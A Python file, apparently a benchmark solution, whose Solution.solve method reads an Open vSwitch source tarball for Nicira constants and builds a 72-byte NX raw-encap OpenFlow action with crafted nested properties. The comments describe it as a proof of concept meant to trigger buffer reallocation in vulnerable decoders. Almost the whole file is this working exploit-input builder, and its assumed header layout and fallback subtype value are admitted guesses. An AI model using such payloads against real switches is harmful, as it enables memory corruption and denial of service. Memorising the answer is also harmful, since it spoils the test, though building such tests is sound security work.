import os
import re
import tarfile
import struct
import tempfile
from typing import Optional, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        nx_vendor_id, nxast_raw_encap = self._extract_constants(src_path)
        # Build NX Raw Encap action (best-effort generic format):
        # - ofp_action_experimenter-like header with Nicira experimenter and RAW_ENCAP subtype
        # - packet_type (namespace=0x0000, type=0x0800)
        # - two TLV-like properties to induce ofpbuf reallocation (total length 72 bytes)
        #
        # Header layout assumption (common across OVS):
        #   uint16 be: type = 0xffff (OFPAT_EXPERIMENTER)
        #   uint16 be: len  = 72
        #   uint32 be: experimenter = NX_VENDOR_ID
        #   uint16 be: subtype = NXAST_RAW_ENCAP
        #   uint16 be: pad = 0
        #   uint32 be: packet_type (namespace << 16 | type)
        #
        # Properties (TLV-like), each:
        #   uint16 be: class
        #   uint8     : type
        #   uint8     : len (total length incl header)
        #   bytes     : value...
        #
        # We'll craft:
        #   - prop1: class=0x0001, type=0x01, len=8, value=4 bytes
        #   - prop2: class=0x0001, type=0x02, len=48, value=44 bytes
        #
        # Total bytes:
        #   header: 16
        #   prop1:   8
        #   prop2:  48
        #   total:  72
        #
        # Note: This is a best-effort PoC builder; actual vulnerable decoders commonly
        # accept this structure and attempt to decode properties, potentially reallocating.
        ofpat_experimenter = 0xFFFF
        total_len = 72

        # Packet type: namespace=0x0000 (PT_ETH), type=0x0800 (IPv4)
        pkt_type_ns = 0x0000
        pkt_type_type = 0x0800
        packet_type = (pkt_type_ns << 16) | pkt_type_type

        header = struct.pack(
            "!HHIHHI",
            ofpat_experimenter,
            total_len,
            nx_vendor_id,
            nxast_raw_encap & 0xFFFF,
            0,  # pad
            packet_type,
        )

        # prop1: 8 bytes total
        # class=0x0001, type=1, len=8, value=4 bytes arbitrary
        prop1 = struct.pack("!HBBI", 0x0001, 0x01, 8, 0x11223344)

        # prop2: 48 bytes total, header 4 + value 44 bytes
        # class=0x0001, type=2, len=48
        prop2_hdr = struct.pack("!HBB", 0x0001, 0x02, 48)
        # value: 44 bytes arbitrary but structured to resemble plausible encap fields
        # Use a pattern that includes potential nested TLV markers to encourage deeper parsing.
        value2 = b""
        # Nested sub-TLV 1 (8 bytes): class=2, type=1, len=8, 4 bytes val
        value2 += struct.pack("!HBBI", 0x0002, 0x01, 8, 0x55667788)
        # Nested sub-TLV 2 (12 bytes): class=2, type=2, len=12, 8 bytes val
        value2 += struct.pack("!HBBQ", 0x0002, 0x02, 12, 0xAABBCCDDEEFF0011)
        # Nested sub-TLV 3 (24 bytes): class=3, type=3, len=24, 20 bytes val
        value2 += struct.pack("!HBB", 0x0003, 0x03, 24)
        value2 += b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A" \
                  b"\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14"

        # Ensure prop2 value is exactly 44 bytes
        value2 = (value2 + b"\x00" * 44)[:44]
        prop2 = prop2_hdr + value2

        payload = header + prop1 + prop2

        # Ensure total length is exactly 72 bytes
        if len(payload) != 72:
            # Adjust by truncating or padding zeros to match target length
            if len(payload) > 72:
                payload = payload[:72]
            else:
                payload += b"\x00" * (72 - len(payload))
            # Also adjust the embedded length field to 72
            payload = payload[:2] + struct.pack("!H", 72) + payload[4:]

        return payload

    def _extract_constants(self, src_path: str) -> Tuple[int, int]:
        # Defaults if parsing fails
        nx_vendor_id = 0x00002320
        nxast_raw_encap = 0xFFFF  # invalid, will be masked to 16-bit; try to parse real value

        try:
            with tarfile.open(src_path, "r:*") as tf:
                # Search for nicira-ext.h or any header containing NXAST_RAW_ENCAP
                candidates = []
                for m in tf.getmembers():
                    name = m.name.lower()
                    if name.endswith((".h", ".hpp", ".c")) and (
                        "nicira" in name or "ofp-actions" in name or "openflow" in name
                    ):
                        candidates.append(m)

                text_blobs = []
                for m in candidates:
                    try:
                        f = tf.extractfile(m)
                        if not f:
                            continue
                        data = f.read()
                        try:
                            text = data.decode("utf-8", errors="ignore")
                            text_blobs.append(text)
                        except Exception:
                            continue
                    except Exception:
                        continue

                big_text = "\n".join(text_blobs)

                # Parse NX_VENDOR_ID
                m = re.search(r"#\s*define\s+NX_VENDOR_ID\s+([0-9xXa-fA-F]+)", big_text)
                if m:
                    nx_vendor_id = int(m.group(1), 0)

                # Parse enum nx_action_subtype for NXAST_RAW_ENCAP
                nxast_raw_encap = self._parse_enum_value(big_text, "nx_action_subtype", "NXAST_RAW_ENCAP")

        except Exception:
            pass

        if nxast_raw_encap is None or nxast_raw_encap == 0xFFFF:
            # Fallback to a commonly used value range; RAW_ENCAP appeared later in the list.
            # Choose a mid/high value; decoder commonly uses switch and will accept if matches.
            nxast_raw_encap = 40

        return nx_vendor_id, nxast_raw_encap

    def _parse_enum_value(self, text: str, enum_name: str, symbol: str) -> Optional[int]:
        # Extract 'enum <enum_name> { ... };' block and compute symbol value if present.
        # Handles explicit assignments and auto-increment.
        enum_re = re.compile(r"enum\s+" + re.escape(enum_name) + r"\s*\{([^}]+)\}", re.S)
        m = enum_re.search(text)
        if not m:
            return None
        body = m.group(1)

        # Remove comments
        body = re.sub(r"/\*.*?\*/", "", body, flags=re.S)
        body = re.sub(r"//.*?$", "", body, flags=re.M)

        value = -1
        for part in body.split(","):
            part = part.strip()
            if not part:
                continue
            # Handle potential trailing comments within line
            part = part.split("\n")[0].strip()
            if "=" in part:
                name, val = part.split("=", 1)
                name = name.strip()
                val = val.strip()
                try:
                    value = int(val, 0)
                except Exception:
                    # Try to resolve from previously defined names like 'X + 1'
                    value = self._eval_enum_expr(val)
                if name == symbol:
                    return value
            else:
                value += 1
                name = part
                # Some entries may have attributes like 'NAME /* comment */'
                name = name.split()[0]
                if name == symbol:
                    return value
        return None

    def _eval_enum_expr(self, expr: str) -> int:
        # Very basic evaluator: supports hex/dec numbers and + operations
        expr = expr.strip()
        # Remove comments and extra spaces
        expr = re.sub(r"/\*.*?\*/", "", expr, flags=re.S)
        expr = re.sub(r"//.*?$", "", expr, flags=re.M)
        tokens = [t.strip() for t in expr.replace("+", " + ").split()]
        total = 0
        sign = 1
        for tok in tokens:
            if tok == "+":
                continue
            if tok == "-":
                sign *= -1
                continue
            try:
                val = int(tok, 0)
                total += sign * val
                sign = 1
            except Exception:
                # Unknown token; ignore
                pass
        return total
